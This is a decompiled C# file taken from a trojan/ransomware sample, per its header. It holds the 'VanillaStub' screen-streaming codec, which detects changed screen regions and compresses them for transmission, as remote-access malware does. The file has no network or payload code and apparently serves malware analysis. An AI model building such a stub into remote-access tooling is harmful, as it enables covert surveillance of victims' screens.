// Decompiled with JetBrains decompiler
// Type: VanillaStub.Helpers.Services.StreamLibrary.UnsafeCodecs.UnsafeStreamCodec
// Assembly: VanillaStub, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: EA90E0E3-D3F0-4587-A40F-47A7FA59CCA7
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.06-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-b3851e5c28e260637f2bb0d27bd956234053f958c19d044c30c87ff4b731caac.exe

using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;

namespace VanillaStub.Helpers.Services.StreamLibrary.UnsafeCodecs
{
  public class UnsafeStreamCodec : IUnsafeCodec
  {
    private Bitmap decodedBitmap;
    private byte[] EncodeBuffer;
    private PixelFormat EncodedFormat;
    private int EncodedHeight;
    private int EncodedWidth;
    private readonly bool UseJPEG;

    public UnsafeStreamCodec(int ImageQuality = 100, bool UseJPEG = true)
      : base(ImageQuality)
    {
      this.CheckBlock = new Size(50, 1);
      this.UseJPEG = UseJPEG;
    }

    public override ulong CachedSize { get; internal set; }

    public override int BufferCount => 1;

    public override CodecOption CodecOptions => CodecOption.RequireSameSize;

    public Size CheckBlock { get; }

    public override event IVideoCodec.VideoDebugScanningDelegate onCodeDebugScan;

    public override event IVideoCodec.VideoDebugScanningDelegate onDecodeDebugScan;

    public override unsafe void CodeImage(
      IntPtr Scan0,
      Rectangle ScanArea,
      Size ImageSize,
      PixelFormat Format,
      Stream outStream)
    {
      lock (this.ImageProcessLock)
      {
        byte* int32 = (byte*) Scan0.ToInt32();
        if (!outStream.CanWrite)
          throw new Exception("Must have access to Write in the Stream");
        int num1;
        switch (Format)
        {
          case PixelFormat.Format24bppRgb:
          case PixelFormat.Format32bppRgb:
            num1 = 3;
            break;
          case PixelFormat.Format32bppPArgb:
          case PixelFormat.Format32bppArgb:
            num1 = 4;
            break;
          default:
            throw new NotSupportedException(Format.ToString());
        }
        int num2 = ImageSize.Width * num1;
        int count1 = num2 * ImageSize.Height;
        if (this.EncodeBuffer == null)
        {
          this.EncodedFormat = Format;
          this.EncodedWidth = ImageSize.Width;
          this.EncodedHeight = ImageSize.Height;
          this.EncodeBuffer = new byte[count1];
          fixed (byte* numPtr = this.EncodeBuffer)
          {
            byte[] buffer = (byte[]) null;
            using (Bitmap bmp = new Bitmap(ImageSize.Width, ImageSize.Height, num2, Format, Scan0))
              buffer = this.jpgCompression.Compress(bmp);
            outStream.Write(BitConverter.GetBytes(buffer.Length), 0, 4);
            outStream.Write(buffer, 0, buffer.Length);
            VanillaStub.Helpers.Services.StreamLibrary.src.NativeMethods.memcpy(new IntPtr((void*) numPtr), Scan0, (uint) count1);
          }
        }
        else
        {
          long position1 = outStream.Position;
          outStream.Write(new byte[4], 0, 4);
          int num3 = 0;
          if (this.EncodedFormat != Format)
            throw new Exception("PixelFormat is not equal to previous Bitmap");
          if (this.EncodedWidth != ImageSize.Width || this.EncodedHeight != ImageSize.Height)
            throw new Exception("Bitmap width/height are not equal to previous bitmap");
          List<Rectangle> rectangleList1 = new List<Rectangle>();
          Size size1;
          ref Size local1 = ref size1;
          int width1 = ScanArea.Width;
          Size checkBlock = this.CheckBlock;
          int height1 = checkBlock.Height;
          local1 = new Size(width1, height1);
          Size size2;
          ref Size local2 = ref size2;
          int width2 = ScanArea.Width;
          checkBlock = this.CheckBlock;
          int width3 = checkBlock.Width;
          int width4 = width2 % width3;
          int height2 = ScanArea.Height;
          checkBlock = this.CheckBlock;
          int height3 = checkBlock.Height;
          int height4 = height2 % height3;
          local2 = new Size(width4, height4);
          int num4 = ScanArea.Height - size2.Height;
          int num5 = ScanArea.Width - size2.Width;
          Rectangle ScanArea1 = new Rectangle();
          List<Rectangle> rectangleList2 = new List<Rectangle>();
          size1 = new Size(ScanArea.Width, size1.Height);
          fixed (byte* numPtr = this.EncodeBuffer)
          {
            Rectangle rectangle1;
            for (int y1 = ScanArea.Y; y1 != ScanArea.Height; y1 += size1.Height)
            {
              if (y1 == num4)
                size1 = new Size(ScanArea.Width, size2.Height);
              ScanArea1 = new Rectangle(ScanArea.X, y1, ScanArea.Width, size1.Height);
              if (this.onCodeDebugScan != null)
                this.onCodeDebugScan(ScanArea1);
              int num6 = y1 * num2 + ScanArea.X * num1;
              if (VanillaStub.Helpers.Services.StreamLibrary.src.NativeMethods.memcmp(numPtr + num6, int32 + num6, (uint) num2) != 0)
              {
                int index = rectangleList1.Count - 1;
                int num7;
                if (rectangleList1.Count != 0)
                {
                  rectangle1 = rectangleList1[index];
                  int y2 = rectangle1.Y;
                  rectangle1 = rectangleList1[index];
                  int height5 = rectangle1.Height;
                  num7 = y2 + height5 == ScanArea1.Y ? 1 : 0;
                }
                else
                  num7 = 0;
                if (num7 != 0)
                {
                  ref Rectangle local3 = ref ScanArea1;
                  rectangle1 = rectangleList1[index];
                  int x = rectangle1.X;
                  rectangle1 = rectangleList1[index];
                  int y3 = rectangle1.Y;
                  rectangle1 = rectangleList1[index];
                  int width5 = rectangle1.Width;
                  rectangle1 = rectangleList1[index];
                  int height6 = rectangle1.Height + ScanArea1.Height;
                  local3 = new Rectangle(x, y3, width5, height6);
                  rectangleList1[index] = ScanArea1;
                }
                else
                  rectangleList1.Add(ScanArea1);
              }
            }
            int index1 = 0;
            int x1 = ScanArea.X;
            for (; index1 < rectangleList1.Count; ++index1)
            {
              ref Size local4 = ref size1;
              checkBlock = this.CheckBlock;
              int width6 = checkBlock.Width;
              rectangle1 = rectangleList1[index1];
              int height7 = rectangle1.Height;
              local4 = new Size(width6, height7);
              for (int x2 = ScanArea.X; x2 != ScanArea.Width; x2 += size1.Width)
              {
                if (x2 == num5)
                {
                  ref Size local5 = ref size1;
                  int width7 = size2.Width;
                  rectangle1 = rectangleList1[index1];
                  int height8 = rectangle1.Height;
                  local5 = new Size(width7, height8);
                }
                ref Rectangle local6 = ref ScanArea1;
                int x3 = x2;
                rectangle1 = rectangleList1[index1];
                int y = rectangle1.Y;
                int width8 = size1.Width;
                rectangle1 = rectangleList1[index1];
                int height9 = rectangle1.Height;
                local6 = new Rectangle(x3, y, width8, height9);
                bool flag = false;
                int count2 = num1 * ScanArea1.Width;
                for (int index2 = 0; index2 < ScanArea1.Height; ++index2)
                {
                  int num8 = num2 * (ScanArea1.Y + index2) + num1 * ScanArea1.X;
                  if (VanillaStub.Helpers.Services.StreamLibrary.src.NativeMethods.memcmp(numPtr + num8, int32 + num8, (uint) count2) != 0)
                    flag = true;
                  VanillaStub.Helpers.Services.StreamLibrary.src.NativeMethods.memcpy((void*) (numPtr + num8), (void*) (int32 + num8), (uint) count2);
                }
                if (this.onCodeDebugScan != null)
                  this.onCodeDebugScan(ScanArea1);
                if (flag)
                {
                  int index3 = rectangleList2.Count - 1;
                  int num9;
                  if (rectangleList2.Count > 0)
                  {
                    rectangle1 = rectangleList2[index3];
                    int x4 = rectangle1.X;
                    rectangle1 = rectangleList2[index3];
                    int width9 = rectangle1.Width;
                    num9 = x4 + width9 == ScanArea1.X ? 1 : 0;
                  }
                  else
                    num9 = 0;
                  if (num9 != 0)
                  {
                    Rectangle rectangle2 = rectangleList2[index3];
                    int width10 = ScanArea1.Width + rectangle2.Width;
                    ScanArea1 = new Rectangle(rectangle2.X, rectangle2.Y, width10, rectangle2.Height);
                    rectangleList2[index3] = ScanArea1;
                  }
                  else
                    rectangleList2.Add(ScanArea1);
                }
              }
            }
          }
          for (int index = 0; index < rectangleList2.Count; ++index)
          {
            Rectangle rectangle = rectangleList2[index];
            int count3 = num1 * rectangle.Width;
            Bitmap bmp = new Bitmap(rectangle.Width, rectangle.Height, Format);
            BitmapData bitmapdata = bmp.LockBits(new Rectangle(0, 0, bmp.Width, bmp.Height), ImageLockMode.ReadWrite, bmp.PixelFormat);
            int num10 = 0;
            int num11 = 0;
            for (; num10 < rectangle.Height; ++num10)
            {
              int num12 = num2 * (rectangle.Y + num10) + num1 * rectangle.X;
              VanillaStub.Helpers.Services.StreamLibrary.src.NativeMethods.memcpy((void*) ((IntPtr) bitmapdata.Scan0.ToPointer() + num11), (void*) (int32 + num12), (uint) count3);
              num11 += count3;
            }
            bmp.UnlockBits(bitmapdata);
            outStream.Write(BitConverter.GetBytes(rectangle.X), 0, 4);
            outStream.Write(BitConverter.GetBytes(rectangle.Y), 0, 4);
            outStream.Write(BitConverter.GetBytes(rectangle.Width), 0, 4);
            outStream.Write(BitConverter.GetBytes(rectangle.Height), 0, 4);
            outStream.Write(new byte[4], 0, 4);
            long length = outStream.Length;
            long position2 = outStream.Position;
            if (this.UseJPEG)
              this.jpgCompression.Compress(bmp, ref outStream);
            else
              this.lzwCompression.Compress(bmp, outStream);
            long num13 = outStream.Position - length;
            outStream.Position = position2 - 4L;
            outStream.Write(BitConverter.GetBytes((int) num13), 0, 4);
            outStream.Position += num13;
            bmp.Dispose();
            num3 += (int) num13 + 20;
          }
          outStream.Position = position1;
          outStream.Write(BitConverter.GetBytes(num3), 0, 4);
          rectangleList1.Clear();
          rectangleList2.Clear();
        }
      }
    }

    public override unsafe Bitmap DecodeData(IntPtr CodecBuffer, uint Length)
    {
      if (Length < 4U)
        return this.decodedBitmap;
      int count = *(int*) (void*) CodecBuffer;
      if (this.decodedBitmap != null)
        return this.decodedBitmap;
      byte[] buffer = new byte[count];
      fixed (byte* numPtr = buffer)
        VanillaStub.Helpers.Services.StreamLibrary.src.NativeMethods.memcpy(new IntPtr((void*) numPtr), new IntPtr(CodecBuffer.ToInt32() + 4), (uint) count);
      this.decodedBitmap = (Bitmap) Image.FromStream((Stream) new MemoryStream(buffer));
      return this.decodedBitmap;
    }

    public override Bitmap DecodeData(Stream inStream)
    {
      byte[] buffer1 = new byte[4];
      inStream.Read(buffer1, 0, 4);
      int int32_1 = BitConverter.ToInt32(buffer1, 0);
      if (this.decodedBitmap == null)
      {
        byte[] buffer2 = new byte[int32_1];
        inStream.Read(buffer2, 0, buffer2.Length);
        this.decodedBitmap = (Bitmap) Image.FromStream((Stream) new MemoryStream(buffer2));
        return this.decodedBitmap;
      }
      int int32_2;
      using (Graphics graphics = Graphics.FromImage((Image) this.decodedBitmap))
      {
        for (; int32_1 > 0; int32_1 -= int32_2 + 20)
        {
          byte[] buffer3 = new byte[20];
          inStream.Read(buffer3, 0, buffer3.Length);
          Rectangle ScanArea = new Rectangle(BitConverter.ToInt32(buffer3, 0), BitConverter.ToInt32(buffer3, 4), BitConverter.ToInt32(buffer3, 8), BitConverter.ToInt32(buffer3, 12));
          int32_2 = BitConverter.ToInt32(buffer3, 16);
          byte[] buffer4 = new byte[int32_2];
          inStream.Read(buffer4, 0, buffer4.Length);
          if (this.onDecodeDebugScan != null)
            this.onDecodeDebugScan(ScanArea);
          using (MemoryStream memoryStream = new MemoryStream(buffer4))
          {
            using (Bitmap bitmap = (Bitmap) Image.FromStream((Stream) memoryStream))
              graphics.DrawImage((Image) bitmap, ScanArea.Location);
          }
        }
      }
      return this.decodedBitmap;
    }
  }
}
